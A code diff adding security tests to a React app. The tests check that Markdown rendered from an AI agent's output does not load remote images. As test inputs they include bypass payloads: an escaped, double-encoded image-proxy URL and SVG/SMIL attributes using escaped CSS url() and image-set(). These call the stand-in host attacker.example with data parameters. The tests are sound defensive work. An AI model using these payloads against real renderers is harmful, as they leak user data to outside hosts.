@@ -19,6 +19,9 @@
  * its own `onClick`. The next render reads the member's choice back from the
  * store, which is the path a real click takes.
  */
+import { readdirSync, readFileSync, statSync } from "node:fs";
+import { join, relative, sep } from "node:path";
+import { fileURLToPath } from "node:url";
 import { createElement, isValidElement, type ReactElement, type ReactNode } from "react";
 import { renderToStaticMarkup } from "react-dom/server";
 import { beforeEach, describe, expect, it, vi } from "vitest";
@@ -174,6 +177,21 @@ describe("MarkdownBody — a remote image loads only on a click", () => {
     expect(html).toContain("Image from attacker.example");
   });
 
+  it("gates a same-origin proxy hidden behind an escaped ? in the path", () => {
+    // Review finding 1: `remoteHost` used to read only the real query.
+    const hidden =
+      "/api/email/image-proxy%3Furl=https%253A%252F%252Fattacker.example%252Fp.png%253Fd%253D1";
+    const noSession = renderToStaticMarkup(chat(`![x](${hidden})`));
+    expect(imgs(noSession)).toEqual([]);
+    expect(noSession).toContain("Image from attacker.example");
+    // An absolute same-origin URL skips the workspace proxy even with a session.
+    const withSession = renderToStaticMarkup(
+      chat(`![x](https://app.invalid${hidden})`, { sessionId: "s1", mdFilePath: "r.md" }),
+    );
+    expect(imgs(withSession)).toEqual([]);
+    expect(withSession).toContain("Image from attacker.example");
+  });
+
   it("gates a remote image inside a link, and the click stays out of the link", () => {
     const el = chat(`[![logo](${REMOTE})](https://example.com/page)`);
     const before = renderToStaticMarkup(el);
@@ -269,6 +287,38 @@ describe("ArtifactMarkdown — a remote image loads only on a click", () => {
     expect(imgSrcs(html)).toEqual(["/api/agent/workspace/s1/file?path=outputs%2Flocal.png"]);
   });
 
+  it("strips a CSS fetch from an SVG attribute and a SMIL value, escaped or not", () => {
+    // Review finding 2: the CSS checks ran on `style` only.
+    const html = renderToStaticMarkup(
+      artifact(
+        [
+          `<svg width="50" height="50">`,
+          `<rect width="50" height="50" mask="image-set('https://attacker.example/m1.png?d=1' 1x)"></rect>`,
+          `<rect mask="\\75 rl(https://attacker.example/m2.png?d=2)"></rect>`,
+          `<rect fill="\\75 rl(https://attacker.example/f.svg?d=3#a)"></rect>`,
+          `<rect clip-path="\\75 rl(https://attacker.example/c.svg?d=4#a)"></rect>`,
+          `<path marker-end="\\75 rl(https://attacker.example/k.svg?d=5#a)"></path>`,
+          `<rect><animate attributeName="mask" values="\\75 rl(https://attacker.example/a.png?d=6)"></animate></rect>`,
+          `<rect><set attributeName="mask" to="image-set('https://attacker.example/s.png?d=7' 1x)"></set></rect>`,
+          `</svg>`,
+        ].join(""),
+      ),
+    );
+    expect(html).not.toContain("attacker.example");
+  });
+
+  it("strips a raw-HTML fetch through a proxy hidden behind an escaped ?", () => {
+    const hidden =
+      "/api/email/image-proxy%3Furl=https%253A%252F%252Fattacker.example%252Fp.png%253Fd%253D1";
+    const html = renderToStaticMarkup(
+      artifact(
+        `<video poster="${hidden}"></video>\n\n<svg><image href="${hidden}"></image></svg>\n\n` +
+          `<input type="image" src="${hidden}">\n\n<picture><source srcset="${hidden}"><img src="local.png" alt="p"></picture>`,
+      ),
+    );
+    expect(html).not.toContain("image-proxy");
+  });
+
   it("keeps a style that fetches nothing, and a fragment url()", () => {
     const html = renderToStaticMarkup(
       artifact(`<div style="color: red">red</div>\n\n<svg><rect fill="url(#grad)"></rect></svg>`),
@@ -310,6 +360,70 @@ describe("DocumentMarkdown — a remote image loads only on a click", () => {
 
   it("draws a data: image at once", () => {
     expect(imgSrcs(renderToStaticMarkup(doc(`![dot](${DATA_URI})`)))).toEqual([DATA_URI]);
+  });
+
+  it("resolves a relative image against the file, through the workspace proxy", () => {
+    const html = renderToStaticMarkup(
+      createElement(DocumentMarkdown, {
+        content: "![chart](chart.png)",
+        sessionId: "s1",
+        mdFilePath: "outputs/report.md",
+      }),
+    );
+    expect(imgSrcs(html)).toEqual(["/api/agent/workspace/s1/file?path=outputs%2Fchart.png"]);
+  });
+});
+
+// ─── No renderer of agent Markdown skips the gate ──────────────────────────
+
+describe("every react-markdown renderer uses the gate", () => {
+  // A source scan, so a fifth renderer cannot ship without the gate. It is
+  // weaker than the render tests above: it proves the wiring is present,
+  // and the render tests prove it works.
+  const SRC = fileURLToPath(new URL("..", import.meta.url));
+  const files: Array<{ path: string; src: string }> = [];
+  const walk = (dir: string) => {
+    for (const entry of readdirSync(dir)) {
+      const full = join(dir, entry);
+      if (statSync(full).isDirectory()) walk(full);
+      else if (/\.tsx?$/.test(entry) && !/\.test\.tsx?$/.test(entry)) {
+        files.push({ path: relative(SRC, full).split(sep).join("/"), src: readFileSync(full, "utf8") });
+      }
+    }
+  };
+  walk(SRC);
+  // A default import is the renderer. `markdownMedia.ts` imports only the
+  // named `defaultUrlTransform`, and draws nothing.
+  const renderers = files.filter((f) =>
+    /^import\s+[A-Za-z_$][\w$]*\b[^;\n]*from\s+["']react-markdown["']/m.test(f.src),
+  );
+
+  it("finds the four renderers it guards", () => {
+    expect(renderers.map((f) => f.path).sort()).toEqual([
+      "components/ArtifactViewerModal.tsx",
+      "components/DocumentPane.tsx",
+      "components/MarkdownMessage.tsx",
+      "components/ThinkingContainer.tsx",
+    ]);
+  });
+
+  it("each one draws images with MarkdownImage and passes markdownUrlTransform", () => {
+    const offenders = renderers
+      .filter((f) => !f.src.includes("<MarkdownImage") || !f.src.includes("urlTransform={markdownUrlTransform}"))
+      .map((f) => f.path);
+    expect(offenders).toEqual([]);
+  });
+
+  it("each one with rehype-raw runs rehypeGateRemoteMedia right after it", () => {
+    const raw = files.filter((f) => /from\s+["']rehype-raw["']/.test(f.src));
+    expect(raw.length).toBeGreaterThan(0);
+    const offenders = raw
+      .filter((f) => {
+        const uses = f.src.match(/rehypePlugins=\{\[[^\]]*\]\}/g) ?? [];
+        return uses.length === 0 || uses.some((u) => !/\[rehypeRaw,\s*rehypeGateRemoteMedia\b/.test(u));
+      })
+      .map((f) => f.path);
+    expect(offenders).toEqual([]);
   });
 });
 
